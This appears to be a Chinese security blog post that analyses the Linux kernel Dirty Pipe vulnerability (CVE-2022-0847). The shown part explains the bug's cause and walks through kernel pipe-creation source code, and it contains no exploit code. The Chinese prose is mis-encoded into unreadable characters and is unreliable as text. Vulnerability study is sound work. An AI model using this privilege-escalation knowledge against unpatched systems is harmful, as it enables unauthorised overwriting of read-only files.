

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/browser.jpg">
  <link rel="icon" href="/img/browser.jpg">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="korey0sh1">
  <meta name="keywords" content="">
  
    <meta name="description" content="ËÑèËÑèÁöÑÂØºÁÆ°ÔºüÊÄé‰πàÊÑüËßâËøô‰πà‰∏çÂØπÂë¢ü§î">
<meta property="og:type" content="article">
<meta property="og:title" content="CVE-2022-0847ÔºàDirty Pipe) Remake">
<meta property="og:url" content="http://example.com/2024/03/18/dirtypipe/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:description" content="ËÑèËÑèÁöÑÂØºÁÆ°ÔºüÊÄé‰πàÊÑüËßâËøô‰πà‰∏çÂØπÂë¢ü§î">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20240321205252.png">
<meta property="article:published_time" content="2024-03-18T08:14:56.000Z">
<meta property="article:modified_time" content="2024-03-21T15:23:30.172Z">
<meta property="article:author" content="korey0sh1">
<meta property="article:tag" content="OS">
<meta property="article:tag" content="linux">
<meta property="article:tag" content="kernel">
<meta property="article:tag" content="CVE">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20240321205252.png">
  
  
    <meta name="referrer" content="no-referrer-when-downgrade">
  
  
  <title>CVE-2022-0847ÔºàDirty Pipe) Remake - Hexo</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- ‰∏ªÈ¢ò‰æùËµñÁöÑÂõæÊ†áÂ∫ìÔºå‰∏çË¶ÅËá™Ë°å‰øÆÊîπ -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.6","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  

  

  
    <!-- Google tag (gtag.js) -->
    <script async>
      if (!Fluid.ctx.dnt) {
        Fluid.utils.createScript("https://www.googletagmanager.com/gtag/js?id=", function() {
          window.dataLayer = window.dataLayer || [];
          function gtag() {
            dataLayer.push(arguments);
          }
          gtag('js', new Date());
          gtag('config', '');
        });
      }
    </script>
  

  

  

  

  



  
<meta name="generator" content="Hexo 7.0.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>korey0sh1</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/" target="_self">
                <i class="iconfont icon-home-fill"></i>
                <span>È¶ñÈ°µ</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/" target="_self">
                <i class="iconfont icon-archive-fill"></i>
                <span>ÂΩíÊ°£</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/" target="_self">
                <i class="iconfont icon-category-fill"></i>
                <span>ÂàÜÁ±ª</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/" target="_self">
                <i class="iconfont icon-tags-fill"></i>
                <span>Ê†áÁ≠æ</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/" target="_self">
                <i class="iconfont icon-user-fill"></i>
                <span>ÂÖ≥‰∫é</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/links/" target="_self">
                <i class="iconfont icon-link-fill"></i>
                <span>ÂèãÈìæ</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/116096529_p0_master1200.jpg') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="CVE-2022-0847ÔºàDirty Pipe) Remake"></span>
          
        </div>

        
          
  <div class="mt-3">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-author" aria-hidden="true"></i>
        korey0sh1
      </span>
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2024-03-18 16:14" pubdate>
          2024Âπ¥3Êúà18Êó• ‰∏ãÂçà
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          5k Â≠ó
        
      </span>
    

    

    
    
      
        <span id="busuanzi_container_page_pv" style="display: none">
          <i class="iconfont icon-eye" aria-hidden="true"></i>
          <span id="busuanzi_value_page_pv"></span> Ê¨°
        </span>
        
      
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">CVE-2022-0847ÔºàDirty Pipe) Remake</h1>
            
              <p class="note note-info">
                
                  
                    Êú¨ÊñáÊúÄÂêéÊõ¥Êñ∞‰∫éÔºö2024Âπ¥3Êúà21Êó• Êôö‰∏ä
                  
                
              </p>
            
            
              <div class="markdown-body">
                
                <h1 id="0x00ÔºöÂÜôÂú®‰∏ÄÂàá‰πãÂâç"><a href="#0x00ÔºöÂÜôÂú®‰∏ÄÂàá‰πãÂâç" class="headerlink" title="0x00ÔºöÂÜôÂú®‰∏ÄÂàá‰πãÂâç"></a>0x00ÔºöÂÜôÂú®‰∏ÄÂàá‰πãÂâç</h1><p>DirtyÁ≥ªÂàóÁ¨¨‰∫åÂºπ</p>
<p>Âõ†‰∏∫ËØ•ÊºèÊ¥ûÂèëÁé∞Âú®ÂØπÁÆ°ÈÅìÂÜôÂÖ•Êï∞ÊçÆÂêéÔºåËØªÂèñÂÆåÊØïÂêéÊú™Ê∏ÖÁ©∫pipe_buffer-&gt;flagsÔºåÈÄ†ÊàêË∂äÊùÉÂÜôÂÖ•Âè™ËØªÊñá‰ª∂</p>
<p>ÂíåDirty CowÂæàÂÉèÔºåÂõ†Ê≠§Ë¢´ÂÜ†‰ª•Dirty PipeÁöÑÁß∞Âëº</p>
<p>‰ΩÜÊòØÂíåDirty CowÈúÄË¶ÅÁ∫øÁ®ãÁ´û‰∫âÁõ∏ÊØîÔºåDirty PipeÁ®≥ÂÆöËÆ∏Â§ö</p>
<p>PSÔºö‰∏ãÊñáÊâÄÊúâÊ∫êÁ†ÅÁöÑÁâàÊú¨‰∏∫ 5.8</p>
<h1 id="0x01Ôºö‰ø°ÊÅØÊî∂ÈõÜ"><a href="#0x01Ôºö‰ø°ÊÅØÊî∂ÈõÜ" class="headerlink" title="0x01Ôºö‰ø°ÊÅØÊî∂ÈõÜ"></a>0x01Ôºö‰ø°ÊÅØÊî∂ÈõÜ</h1><p><a target="_blank" rel="noopener" href="https://nvd.nist.gov/vuln/detail/cve-2022-0847">NVD - cve-2022-0847 (nist.gov)</a></p>
<p>ÂΩ±ÂìçÁâàÊú¨Ôºö</p>
<p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20240321231636.png" srcset="/img/loading.gif" lazyload></p>
<h1 id="0x02ÔºöÂâçÁΩÆÁü•ËØÜ"><a href="#0x02ÔºöÂâçÁΩÆÁü•ËØÜ" class="headerlink" title="0x02ÔºöÂâçÁΩÆÁü•ËØÜ"></a>0x02ÔºöÂâçÁΩÆÁü•ËØÜ</h1><h2 id="‰Ωï‰∏∫ÂØºÁÆ°ü§î"><a href="#‰Ωï‰∏∫ÂØºÁÆ°ü§î" class="headerlink" title="‰Ωï‰∏∫ÂØºÁÆ°ü§î"></a>‰Ωï‰∏∫ÂØºÁÆ°ü§î</h2><p>‰Ωï‰∏∫ÁÆ°ÈÅìÔºüÂ•ΩÈóÆÈ¢òÔºåÊâÄË∞ìÁÆ°ÈÅìÔºåÂ∞±ÊòØËøûÊé•‰∏Ä‰∏™ÂÜôËøõÁ®ã‰∏é‰∏Ä‰∏™ËØªËøõÁ®ãÔºåÁî®‰∫é‰∏§ËøõÁ®ãÈó¥ÈÄö‰ø°ÁöÑÂÖ±‰∫´Êñá‰ª∂ÔºåÂèàÁß∞pipeÊñá‰ª∂</p>
<p>ÂêëÁÆ°ÈÅìÔºàÂÖ±‰∫´Êñá‰ª∂ÔºâÊèê‰æõËæìÂÖ•ÁöÑÂèëÈÄÅËøõÁ®ãÔºàÂç≥ÂÜôËøõÁ®ãÔºâÔºå‰ª•Â≠óÁ¨¶ÊµÅÂΩ¢ÂºèÂ∞ÜÂ§ßÈáèÁöÑÊï∞ÊçÆÈÄÅÂÖ•ÁÆ°ÈÅìÔºõËÄåÊé•Êî∂ÁÆ°ÈÅìËæìÂá∫ÁöÑÊé•Êî∂ËøõÁ®ãÔºàÂç≥ËØªËøõÁ®ãÔºâÔºåÂèØ‰ªéÁÆ°ÈÅì‰∏≠Êé•Êî∂Êï∞ÊçÆ„ÄÇÁî±‰∫éÂèëÈÄÅËøõÁ®ãÂíåÊé•Êî∂ËøõÁ®ãÊòØÂà©Áî®ÁÆ°ÈÅìËøõË°åÈÄö‰ø°ÁöÑÔºåÊïÖÂèàÁß∞ÁÆ°ÈÅìÈÄö‰ø°„ÄÇ</p>
<p>‰∏∫‰∫ÜÂçèË∞ÉÂèåÊñπÁöÑÈÄö‰ø°ÔºåÁÆ°ÈÅìÈÄö‰ø°Êú∫Âà∂ÂøÖÈ°ªÊèê‰æõ‰ª•‰∏ã3 ÊñπÈù¢ÁöÑÂçèË∞ÉËÉΩÂäõ„ÄÇ</p>
<ul>
<li>‰∫íÊñ•„ÄÇÂΩì‰∏Ä‰∏™ËøõÁ®ãÊ≠£Âú®ÂØπ pipe ËøõË°åËØª&#x2F;ÂÜôÊìç‰ΩúÊó∂ÔºåÂè¶‰∏Ä‰∏™ËøõÁ®ãÂøÖÈ°ªÁ≠âÂæÖ„ÄÇ</li>
<li>ÂêåÊ≠•„ÄÇÂΩìÂÜôÔºàËæìÂÖ•ÔºâËøõÁ®ãÊää‰∏ÄÂÆöÊï∞ÈáèÔºàÂ¶Ç4KBÔºâÊï∞ÊçÆÂÜôÂÖ• pipe ÂêéÔºå‰æøÂéªÁù°Áú†Á≠âÂæÖÔºåÁõ¥Âà∞ËØªÔºàËæìÂá∫ÔºâËøõÁ®ãÂèñËµ∞Êï∞ÊçÆÂêéÔºåÂÜçÊääÂÆÉÂî§ÈÜí„ÄÇÂΩìËØªËøõÁ®ãËØªÂà∞‰∏ÄÁ©∫ pipe Êó∂Ôºå‰πüÂ∫îÁù°Áú†Á≠âÂæÖÔºåÁõ¥Ëá≥ÂÜôËøõÁ®ãÂ∞ÜÊï∞ÊçÆÂÜôÂÖ•ÁÆ°ÈÅìÂêéÔºåÊâçÂ∞ÜÂÆÉÂî§ÈÜí„ÄÇ</li>
<li>ÂØπÊñπÊòØÂê¶Â≠òÂú®„ÄÇÂè™ÊúâÁ°ÆÂÆöÂØπÊñπÂ∑≤Â≠òÂú®Êó∂ÔºåÊâçËÉΩËøõË°åÈÄö‰ø°„ÄÇ</li>
</ul>
<h2 id="pipe-„ÅÆ-Ë∞ÉÁî®Èìæ"><a href="#pipe-„ÅÆ-Ë∞ÉÁî®Èìæ" class="headerlink" title="pipe „ÅÆ Ë∞ÉÁî®Èìæ"></a>pipe „ÅÆ Ë∞ÉÁî®Èìæ</h2><p>Êé•‰∏ãÊù•Â∞±Êù•ÁúãÁúãpipeÁöÑÂÆûÁé∞ËøáÁ®ã</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs scss">do_pipe2<br>	__do_pipe_flags<br>		create_pipe_files<br>			get_pipe_inode<br>				alloc_pipe_info<br></code></pre></td></tr></table></figure>



<h3 id="do-pipe2"><a href="#do-pipe2" class="headerlink" title="do_pipe2"></a>do_pipe2</h3><p>pipeÂíåpipe2ÈÉΩÊòØÁ≥ªÁªüË∞ÉÁî®ÔºåÈÉΩÊòØdo_pipe2ÁöÑÂ•óÂ®ÉÔºå‰∏çÂêåÁöÑÊòØÔºåpipe2ËÉΩËá™Â∑±ÊåáÂÆöflags</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs C">SYSCALL_DEFINE2(pipe2, <span class="hljs-type">int</span> __user *, fildes, <span class="hljs-type">int</span>, flags)<br>&#123;<br>	<span class="hljs-keyword">return</span> do_pipe2(fildes, flags);<br>&#125;<br><br>SYSCALL_DEFINE1(pipe, <span class="hljs-type">int</span> __user *, fildes)<br>&#123;<br>	<span class="hljs-keyword">return</span> do_pipe2(fildes, <span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * sys_pipe() is the normal C calling standard for creating</span><br><span class="hljs-comment"> * a pipe. It&#x27;s not the way Unix traditionally does this, though.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-comment">//fildes ÊòØ‰∏Ä‰∏™ÊåáÂêëÊï¥Êï∞Êï∞ÁªÑÁöÑÊåáÈíàÔºåÁî®‰∫éÂ≠òÂÇ®ÁÆ°ÈÅìÁ´ØÁÇπÁöÑÊñá‰ª∂ÊèèËø∞Á¨¶</span><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">do_pipe2</span><span class="hljs-params">(<span class="hljs-type">int</span> __user *fildes, <span class="hljs-type">int</span> flags)</span><br>&#123;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file</span> *<span class="hljs-title">files</span>[2];</span><br>	<span class="hljs-type">int</span> fd[<span class="hljs-number">2</span>];<br>	<span class="hljs-type">int</span> error;<br>	<span class="hljs-comment">//Ê†∏ÂøÉÂáΩÊï∞ÔºöËøô‰∏™ÂáΩÊï∞È¢ÑËÆ°‰ºöÂàõÂª∫‰∏Ä‰∏™ÁÆ°ÈÅìÔºåÂπ∂ËøîÂõûÁõ∏Â∫îÁöÑÊñá‰ª∂ÊèèËø∞Á¨¶ÂíåÊñá‰ª∂ÊåáÈíàÊï∞ÁªÑ„ÄÇÂ¶ÇÊûúË∞ÉÁî®ÊàêÂäüÔºåËøîÂõûÂÄº‰∏∫0</span><br>	error = __do_pipe_flags(fd, files, flags);<br>	<span class="hljs-keyword">if</span> (!error) &#123;<br>		<span class="hljs-keyword">if</span> (unlikely(copy_to_user(fildes, fd, <span class="hljs-keyword">sizeof</span>(fd)))) &#123;<br>			fput(files[<span class="hljs-number">0</span>]);<br>			fput(files[<span class="hljs-number">1</span>]);<br>			put_unused_fd(fd[<span class="hljs-number">0</span>]);<br>			put_unused_fd(fd[<span class="hljs-number">1</span>]);<br>			error = -EFAULT;<br>		&#125; <span class="hljs-keyword">else</span> &#123;<span class="hljs-comment">//copy_to_user ÊàêÂäüÔºåÈÇ£‰πàÂÆÉÂ∞ÜÈÄöËøá fd_install Â∞ÜÊñá‰ª∂ÊèèËø∞Á¨¶ÂÆâË£ÖÂà∞ÂÜÖÊ†∏‰∏≠Ôºå‰ª•‰æøÁî®Êà∑Á©∫Èó¥ÂèØ‰ª•ÈÄöËøáËøô‰∫õÊñá‰ª∂ÊèèËø∞Á¨¶ËÆøÈóÆÁÆ°ÈÅì„ÄÇ</span><br>			fd_install(fd[<span class="hljs-number">0</span>], files[<span class="hljs-number">0</span>]);<br>			fd_install(fd[<span class="hljs-number">1</span>], files[<span class="hljs-number">1</span>]);<br>		&#125;<br>	&#125;<br>	<span class="hljs-keyword">return</span> error;<br>&#125;<br></code></pre></td></tr></table></figure>

<h3 id="do-pipe-flags"><a href="#do-pipe-flags" class="headerlink" title="__do_pipe_flags"></a>__do_pipe_flags</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> __do_pipe_flags(<span class="hljs-type">int</span> *fd, <span class="hljs-keyword">struct</span> file **files, <span class="hljs-type">int</span> flags)<br>&#123;<br>	<span class="hljs-type">int</span> error;<br>	<span class="hljs-type">int</span> fdw, fdr;<br><br>	<span class="hljs-keyword">if</span> (flags &amp; ~(O_CLOEXEC | O_NONBLOCK | O_DIRECT | O_NOTIFICATION_PIPE))<br>		<span class="hljs-keyword">return</span> -EINVAL;<br>	<br>	error = create_pipe_files(files, flags);<span class="hljs-comment">//Ê†∏ÂøÉÂáΩÊï∞ÔºöÊù•ÂàõÂª∫ÁÆ°ÈÅìÁöÑÊñá‰ª∂ÂØπË±°</span><br>	<span class="hljs-keyword">if</span> (error)<br>		<span class="hljs-keyword">return</span> error;<br>	<br>    <span class="hljs-comment">//‰∏§Ê¨°Êù•Ëé∑ÂèñÊú™‰ΩøÁî®ÁöÑÊñá‰ª∂ÊèèËø∞Á¨¶„ÄÇÂ¶ÇÊûúËé∑ÂèñÂ§±Ë¥•ÔºåÂàôË∑≥ËΩ¨Âà∞ÈîôËØØÂ§ÑÁêÜÈÉ®ÂàÜ„ÄÇ</span><br>	error = get_unused_fd_flags(flags);<br>	<span class="hljs-keyword">if</span> (error &lt; <span class="hljs-number">0</span>)<br>		<span class="hljs-keyword">goto</span> err_read_pipe;<br>	fdr = error;<br><br>	error = get_unused_fd_flags(flags);<br>	<span class="hljs-keyword">if</span> (error &lt; <span class="hljs-number">0</span>)<br>		<span class="hljs-keyword">goto</span> err_fdr;<br>	fdw = error;<br><br>	audit_fd_pair(fdr, fdw);<span class="hljs-comment">//ËÆ∞ÂΩïÊñá‰ª∂ÊèèËø∞Á¨¶ÁöÑÈÖçÂØπÊÉÖÂÜµ</span><br>	fd[<span class="hljs-number">0</span>] = fdr;<br>	fd[<span class="hljs-number">1</span>] = fdw;<br>	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br> err_fdr:<br>	put_unused_fd(fdr);<br> err_read_pipe:<br>	fput(files[<span class="hljs-number">0</span>]);<br>	fput(files[<span class="hljs-number">1</span>]);<br>	<span class="hljs-keyword">return</span> error;<br>&#125;<br><br></code></pre></td></tr></table></figure>

<h3 id="create-pipe-files"><a href="#create-pipe-files" class="headerlink" title="create_pipe_files"></a>create_pipe_files</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">create_pipe_files</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file **res, <span class="hljs-type">int</span> flags)</span><br>&#123;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inode</span> *<span class="hljs-title">inode</span> =</span> get_pipe_inode();<span class="hljs-comment">//Ëé∑Âèñ‰∏Ä‰∏™Áî®‰∫éÁÆ°ÈÅìÁöÑ inode ÂØπË±°</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file</span> *<span class="hljs-title">f</span>;</span><br><br>	<span class="hljs-keyword">if</span> (!inode)<br>		<span class="hljs-keyword">return</span> -ENFILE;<br><br>	<span class="hljs-keyword">if</span> (flags &amp; O_NOTIFICATION_PIPE) &#123;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_WATCH_QUEUE</span><br>		<span class="hljs-keyword">if</span> (watch_queue_init(inode-&gt;i_pipe) &lt; <span class="hljs-number">0</span>) &#123;<br>			iput(inode);<br>			<span class="hljs-keyword">return</span> -ENOMEM;<br>		&#125;<br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>		<span class="hljs-keyword">return</span> -ENOPKG;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>	&#125;<br>	<span class="hljs-comment">//ÂáΩÊï∞ÂàõÂª∫‰∏Ä‰∏™‰º™Êñá‰ª∂ÂØπË±°ÔºåËØ•Êñá‰ª∂ÂØπË±°ËøûÊé•Âà∞‰πãÂâçËé∑ÂèñÁöÑÁÆ°ÈÅì inode ‰∏ä„ÄÇÂÆÉÂ∞ÜÊ†πÊçÆ‰º†ÂÖ•ÁöÑÊ†áÂøóËÆæÁΩÆÊñá‰ª∂ÁöÑËØªÂÜôÂ±ûÊÄßÔºåÂπ∂Â∞ÜÂÖ∂‰∏éÁÆ°ÈÅìÁöÑÊìç‰ΩúÂáΩÊï∞ pipefifo_fops ÂÖ≥ËÅîËµ∑Êù•„ÄÇÂ¶ÇÊûúÂàõÂª∫Â§±Ë¥•Ôºå‰ºöÈáäÊîæ‰πãÂâçÂàÜÈÖçÁöÑÁÆ°ÈÅì‰ø°ÊÅØÂπ∂ÈáäÊîæ inodeÔºåÁÑ∂ÂêéËøîÂõûÁõ∏Â∫îÁöÑÈîôËØØ‰ª£Á†Å„ÄÇ</span><br>	f = alloc_file_pseudo(inode, pipe_mnt, <span class="hljs-string">&quot;&quot;</span>,<br>				O_WRONLY | (flags &amp; (O_NONBLOCK | O_DIRECT)),<br>				&amp;pipefifo_fops);<br>	<span class="hljs-keyword">if</span> (IS_ERR(f)) &#123;<br>		free_pipe_info(inode-&gt;i_pipe);<br>		iput(inode);<br>		<span class="hljs-keyword">return</span> PTR_ERR(f);<br>	&#125;<br>	<span class="hljs-comment">//ÂØπÂàõÂª∫ÁöÑÂÜôÂÖ•Á´ØÊñá‰ª∂ÂØπË±°ËÆæÁΩÆÁßÅÊúâÊï∞ÊçÆÊåáÈíàÊåáÂêëÁÆ°ÈÅìÁöÑ inode„ÄÇ</span><br>	f-&gt;private_data = inode-&gt;i_pipe;<br>	<span class="hljs-comment">//Ë∞ÉÁî® alloc_file_clone ÂáΩÊï∞ÂàõÂª∫‰∏Ä‰∏™ÂÖãÈöÜÁöÑÊñá‰ª∂ÂØπË±°‰Ωú‰∏∫ËØªÂèñÁ´ØÔºåÂêåÊó∂Â∞ÜÂÖ∂‰∏éÁÆ°ÈÅìÁöÑÊìç‰ΩúÂáΩÊï∞ pipefifo_fops ÂÖ≥ËÅîËµ∑Êù•„ÄÇÂ¶ÇÊûúÂàõÂª∫Â§±Ë¥•Ôºå‰ºöÈáäÊîæ‰πãÂâçÂàÜÈÖçÁöÑÁÆ°ÈÅì‰ø°ÊÅØ„ÄÅÈáäÊîæÂÜôÂÖ•Á´ØÊñá‰ª∂ÂØπË±°Âπ∂ËøîÂõûÁõ∏Â∫îÁöÑÈîôËØØ‰ª£Á†Å„ÄÇ</span><br>	res[<span class="hljs-number">0</span>] = alloc_file_clone(f, O_RDONLY | (flags &amp; O_NONBLOCK),<br>				  &amp;pipefifo_fops);<br>	<span class="hljs-keyword">if</span> (IS_ERR(res[<span class="hljs-number">0</span>])) &#123;<br>		put_pipe_info(inode, inode-&gt;i_pipe);<br>		fput(f);<br>		<span class="hljs-keyword">return</span> PTR_ERR(res[<span class="hljs-number">0</span>]);<br>	&#125;<br>	res[<span class="hljs-number">0</span>]-&gt;private_data = inode-&gt;i_pipe;<br>	res[<span class="hljs-number">1</span>] = f;<br>	stream_open(inode, res[<span class="hljs-number">0</span>]);<br>	stream_open(inode, res[<span class="hljs-number">1</span>]);<br>	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

